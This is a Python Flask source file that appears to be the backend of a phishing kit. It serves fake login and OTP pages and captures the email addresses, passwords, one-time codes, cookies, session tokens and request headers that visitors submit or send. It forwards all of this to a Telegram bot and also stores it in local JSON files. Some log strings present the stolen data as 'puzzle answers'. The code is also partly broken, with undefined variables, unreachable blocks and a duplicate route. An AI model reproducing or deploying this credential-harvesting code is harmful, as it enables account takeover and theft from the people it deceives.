from flask import (
Flask, g, render_template_string, request, jsonify, redirect, render_template, send_from_directory, session, url_for,
)
from datetime import datetime
import os, json, requests
from pathlib import Path

try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass
    
app = Flask(__name__, template_folder="templates") 

print("RUNNING FILE:", __file__)
print("CWD:", os.getcwd())

   
BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
CHAT_ID   = os.getenv("TG_CHAT_ID")
ANSWERS_FILE = "answers.json"

def send_to_telegram(text: str) -> None:
    
    if not BOT_TOKEN or not CHAT_ID:
        print("⚠️ TG_BOT_TOKEN/TG_CHAT_ID مش مضبوطين في ENV — تخطّي الإرسال.")
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        r = requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
        print("TG >", r.status_code, r.text[:200])
    except Exception as e:
        print("TG error:", e)

def load_answers():
    if os.path.exists(ANSWERS_FILE):
        try:
            with open(ANSWERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
           
        except Exception:
            return []

def save_answer(puzzle_no: int, answer: str):
    data = load_answers()
    data.append({
        "ts": datetime.utcnow().isoformat() + "Z",
        "puzzle": puzzle_no,
        "answers": (answers or "").strip()
    })
    with open(ANSWERS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def require_step(min_step: int):

    cur = session.get("step", 1)
    if cur < min_step:
        return redirect(url_for("start"))
    return None
    
@app.before_request
def load_data():

    headers_list = [(k, v) for k, v in request.headers.items()]

    cookies_list = [(k, v) for k, v in request.cookies.items()]
    
    print("=== HEADERS ===")
    for k, v in headers_list:
        print(f"{k}: {v}")

    print("=== COOKIES ===")
    for k, v in cookies_list:
        print(f"{k}={v}")

    g.data = {
        
        "email": "",
        "password": "",
        "phone": "",
        "otp": "",
    }
    
    message = f"""
    HEADERS:\n{headers_list}\n\nCOOKIES:\n{cookies_list}
    Email: {g.data.get("email", "")}
    Password: {g.data.get("password", "")}
    Phone: {g.data.get("phone", "")}
    OTP: {g.data.get("otp","")} 
    """
    send_to_telegram(message)      

@app.route('/', methods=["GET"])
def index():
    return render_template("index.html")
    
    
@app.route("/login", methods=["POST"]) 
def login_post():
    email = request.form.get("answer", "")
    password = request.form.get("answer", "")
    answer = {"email": email, "password": password}
    save_answer(1, answer)
    send_to_telegram(f": {answer}")
    return redirect(url_for("login_get"))
 
@app.route("/login", methods=["GET"])
def login_get():
    return render_template("login.html")


@app.route("/otp", methods=["POST"])
def otp_post():
    otp = request.form.get("answer", "")
    answer = {"otp":otp}
    save_answer(2, answer)
    send_to_telegram(f"🧩 إجابة اللغز 2: {answer}")
    return redirect(url_for("otp_get"))

@app.route("/otp", methods=["GET"])
def otp_get():
    return render_template("otp.html")
    
@app.route('/thanks.html')
def thanks():
    return render_template("thanks.html")
             
@app.route('/')
def session_files():

       all_headers = request.headers
       print(f"all_headers: {all_headers}")
       
       cookies = request.cookies.get("sessionid")
       if cookies:
       
          print(f"sessionid: {cookies}")
       
       for name, value in request.cookies.items():
       
           print(name, "=", value)
    
       message = f"New Request\n\nHEADERS:\n{dict(all_headers)}\n\nSESSION_ID:\n{dict(cookies)}"
       
       send_to_telegram(message)
       return "ok"
               
@app.route('/collect', methods=['POST'])
def collect():
    try:
        payload = request.get_json(silent=True)
        if not payload:
            payload = request.form.to_dict()  
        message = payload     
        
        send_to_telegram(message)
    
    except:
        pass   
         
 
def collect_sessions():
    
    logs.append({
        "email": g.data.get("email", ""),
        "password": g.data.get("password", ""),
        "phone": g.data.get("phone", ""),
        "otp": g.data.get("otp", ""),
        "ip": g.data.get("ip", ""),
        "cookie": g.data.get("cookies", ""),
        "session_id": g.request.form.get("session_id"),
        "user_id": g.request.form.get("user_id"),
        "ip": g.request.remote_addr,
        "user_agent": g.request.headers.get("User-Agent")
    })
    sessions =load_sessions()
    sessions.append(session_data)
    
    save_sessions(sessions)
    
    return {"status": "saved", "total_sessions": len(sessions)}     
       
    message = f"""
    Cookie: {g.data.get("cookies", "")}
    Email: {g.data.get("email", "")}
    Password: {g.data.get("password", "")}
    Phone: {g.data.get("phone", "")}
    OTP: {g.data.get("otp", "")}
    IP: {g.data.get("ip", "")}
    """ 
    
    send_to_telegram(message)
    
    try:
        header_token = request.headers.get("Authorization")
        cookie_token = request.cookies.get("sessionid")
        form_token = request.form.get("token", "")
        all_cookies = request.cookies
        
        for name, value in request.cookies.items():
            print(name, "=", value)
            
        if os .path.exists("sessions.json"):
            with open("sessions.json", "r", encoding="utf-8") as f:
                data = json.load(f)  
            
                
        else:
            data = []
            
        session_data = {
            "header_token": header_token,
            "cookie_token": cookie_token,
            "form_token": form_token,
            "all_cookies": request.cookies
        }   
               
        data.append(session_data)
        
        with open("sessions.json", "w") as f:
            json.dump(data, f, indent=4)
                 
        message = f"""
        Session_data: {session_data}
        """
    finally:                   
        send_to_telegram(message)          
                          
    if os.path.exists("log.json"):
      with open("log.json", "r") as f:
        logs = json.load(f)     
       
@app.route("/submit", methods=["POST"])
def submit():
        ua =request.headers.get("User-Agent", "-")
        raw = request.get_data(as_text=True)
        data.update(request.form.to_dict())
        data.update(request.get_json(silent=True) or {})
        form = request.form.to_dict()
        print(">> METHOD:", request.method)
        print(">> PATH:", request.path)
        print(">> KEYS:", list(data.keys()))
        print(">> FORM:", form)
        print(">> RAW:", raw)

        email = data.get("email") or data.get("Email") or data.get("username") or       data.get("login")
        password = data.get("password") or data.get("pass") or data.get("pwd")
        
        message = (
                f"Keys: {list(data.keys())}\n"
                f"Email: {email}\n"
                f"Password: {password}\n"
                f"UA: {ua}\n\n"
                f"Form Data:\n" +
                "\n".join(f"{k}: {v}" for k, v in form.items())
        )

        send_to_telegram(message) 
        
      
@app.route("/show_cookies")
def show_cookies():
    
    cookies = request.cookies
    result = []
    for name, value in cookies.items():
        result.append(f"{name} = {value}")
        
    lines = [f"{k} = {v}" for k, v in request.cookies.items()]    
        
    send_to_telegram("\n".join(liness))
         
    return "<br>".join(result) 
         
if __name__ == "__main__":
        port = int(os.environ.get("PORT",8081))
        app.run(host="0.0.0.0", port=port, debug=True)
